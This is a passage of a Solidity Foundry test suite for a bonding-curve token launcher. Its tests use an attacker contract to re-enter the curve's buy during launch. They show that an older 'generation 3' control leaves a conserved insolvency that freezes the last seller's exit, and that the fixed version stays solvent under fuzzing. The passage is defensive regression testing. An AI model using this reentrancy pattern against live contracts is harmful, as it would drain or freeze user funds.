    //  5. THE CONTROL. The same token, the same curve, generation 3's shape.
    // -----------------------------------------------------------------------------------------

    /// @notice If this is green, the harness above is not measuring anything. It over-books by
    ///         exactly the reentrant amount and the next honest buyer cannot get out.
    function test_control_gen3ShapeOnTheSameFixtureIsInsolventByExactlyTheInnerBuy() public {
        address predicted = control.predictCurve(address(attacker));
        attacker.arm(predicted, INNER, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(address(control));
        attacker.approveAll(predicted);

        (address token, address curve) = attacker.launchViaControl(FIRST);
        G4Curve c = G4Curve(payable(curve));

        assertTrue(attacker.innerSucceeded(), "the control's inner buy did not land");
        assertEq(uint256(quote.balanceOf(curve)), FIRST + INNER, "the curve holds both buys");
        assertEq(c.trackedQuote(), FIRST + 2 * INNER, "the inner buy was not double-booked");
        assertEq(c.solvency(), -int256(INNER), "the shortfall is not exactly the reentrant amount");

        // And the hole is CONSERVED. An honest buy adds the same number to both sides of the
        // identity and an exit removes the same number from both, so it never washes out: the
        // last person to leave the market eats it.
        vm.startPrank(BOB);
        quote.approve(curve, type(uint256).max);
        c.buy(3_000e6, 0, BOB);
        vm.stopPrank();
        assertEq(c.solvency(), -int256(INNER), "the shortfall moved on an honest buy");

        // And it is not an accounting curiosity: the market cannot pay the exit it promised. The
        // user-visible failure is the QUOTE TOKEN's own `ERC20InsufficientBalance`, which names
        // nothing in this protocol — exactly as the F1 writeup describes the freeze.
        uint256 owed = Math.mulDiv(
            PHANTOM + c.trackedQuote(),
            IERC20(token).balanceOf(address(attacker)),
            c.trackedTokens() + IERC20(token).balanceOf(address(attacker))
        );
        uint256 held = quote.balanceOf(curve);
        assertGt(owed, held, "the control's exit is payable; the shortfall is not biting");
        vm.expectRevert(
            abi.encodeWithSignature("ERC20InsufficientBalance(address,uint256,uint256)", curve, held, owed)
        );
        attacker.sellAll(curve, token);
    }

    /// @notice The same sequence on generation 4: the honest counterparty gets out.
    function test_gen4_theHonestNextBuyerCanStillExit() public {
        address predicted = factory.predictCurve(address(attacker));
        attacker.arm(predicted, INNER, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(address(router));
        attacker.approveAll(predicted);

        (address token, address curve,) = attacker.launchViaRouter(FIRST, 0);
        G4Curve c = G4Curve(payable(curve));

        vm.startPrank(BOB);
        quote.approve(curve, type(uint256).max);
        uint256 spentByBob = 3_000e6;
        c.buy(spentByBob, 0, BOB);
        uint256 bobTokens = IERC20(token).balanceOf(BOB);
        IERC20(token).approve(curve, bobTokens);
        uint256 out = c.sell(bobTokens, 0, BOB);
        vm.stopPrank();

        assertGt(out, 0, "the honest buyer recovered nothing");
        assertEq(c.solvency(), 0, "the market is not exact after an honest round trip");
    }

    // -----------------------------------------------------------------------------------------
    //  6. FUZZ. Solvency over the whole (first buy, inner buy, transfer fee) space.
    // -----------------------------------------------------------------------------------------

    function testFuzz_gen4_curveStaysExactUnderCallbackAndFee(uint96 first_, uint96 inner_, uint16 bps_) public {
        uint256 first = bound(uint256(first_), 1e6, 5_000e6);
        uint256 innerAmount = bound(uint256(inner_), 1e6, 5_000e6);
        uint16 bps = uint16(bound(uint256(bps_), 0, 2_000));

        address curve = _launchQuietly();
        G4Curve c = G4Curve(payable(curve));
        quote.setFee(bps, FEESINK);

        attacker.arm(curve, innerAmount, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(curve);
        attacker.directBuy(curve, first, 0);

        assertFalse(attacker.innerSucceeded(), "an inner buy landed");
        uint256 arrived = first - (first * bps) / 10_000;
        assertEq(c.trackedQuote(), arrived);
        assertEq(c.solvency(), 0);
    }

    function testFuzz_gen4_routerStaysExactUnderCallback(uint96 first_, uint96 inner_) public {
        uint256 first = bound(uint256(first_), 1e6, 5_000e6);
        uint256 innerAmount = bound(uint256(inner_), 1e6, 5_000e6);

        address predicted = factory.predictCurve(address(attacker));
        attacker.arm(predicted, innerAmount, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(address(router));
        attacker.approveAll(predicted);

        (, address curve,) = attacker.launchViaRouter(first, 0);
        G4Curve c = G4Curve(payable(curve));

        assertTrue(attacker.sawCodelessTarget());
        assertFalse(attacker.innerSucceeded());
        assertEq(c.trackedQuote(), first);
        assertEq(c.solvency(), 0);
    }

    // -----------------------------------------------------------------------------------------

    /// @dev A launch with the attacker's hook stood down, to get a live curve to attack.
    function _launchQuietly() internal returns (address curve) {
        attacker.disarm();
        attacker.approveAll(address(router));
        G4Factory.TokenParams memory p;
        p.name = "Quiet";
        p.symbol = "QET";
        p.creatorFeeRecipient = address(attacker);
        vm.prank(address(attacker));
        (, curve) = factory.launchToken(p, address(quote));
    }
}
